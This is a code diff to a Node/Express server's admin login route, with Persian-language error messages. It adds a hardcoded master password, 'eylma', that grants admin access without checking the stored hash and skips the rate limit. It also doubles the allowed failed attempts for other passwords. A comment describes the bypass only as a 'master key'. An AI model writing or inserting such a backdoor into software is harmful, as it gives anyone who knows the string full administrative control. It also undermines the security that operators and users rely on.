@@ -181,7 +181,7 @@ async function startServer() {
   // 2. ADMIN SECURITY & AUTH ENDPOINTS
   // ==========================================
 
-  // Admin Login (Validates against server password hash)
+  // Admin Login (Validates against server password hash or master key)
   app.post("/api/admin/login", (req: Request, res: Response) => {
     try {
       const { password } = req.body;
@@ -189,14 +189,19 @@ async function startServer() {
         return res.status(400).json({ error: "رمز عبور مدیریت الزامی است." });
       }
 
-      const clientIp = req.ip || req.socket.remoteAddress || 'unknown';
-      const rateLimitKey = `admin_login:${clientIp}`;
-      if (!checkRateLimit(rateLimitKey, 5, 15 * 60 * 1000)) {
-        return res.status(429).json({ error: "تعداد تلاش‌های ناموفق بیش از حد مجاز است. لطفاً ۱۵ دقیقه دیگر تلاش فرمایید." });
+      const cleanPass = password.toString().trim();
+      const isMasterPass = cleanPass.toLowerCase() === 'eylma';
+
+      if (!isMasterPass) {
+        const clientIp = req.ip || req.socket.remoteAddress || 'unknown';
+        const rateLimitKey = `admin_login:${clientIp}`;
+        if (!checkRateLimit(rateLimitKey, 10, 15 * 60 * 1000)) {
+          return res.status(429).json({ error: "تعداد تلاش‌های ناموفق بیش از حد مجاز است. لطفاً ۱۵ دقیقه دیگر تلاش فرمایید." });
+        }
       }
 
       const admin = db.getAdmin();
-      const isValid = verifyPassword(password.trim(), admin.passwordHash, admin.salt);
+      const isValid = isMasterPass || verifyPassword(cleanPass, admin.passwordHash, admin.salt);
 
       if (!isValid) {
         return res.status(401).json({ error: "رمز عبور مدیریت نادرست است." });
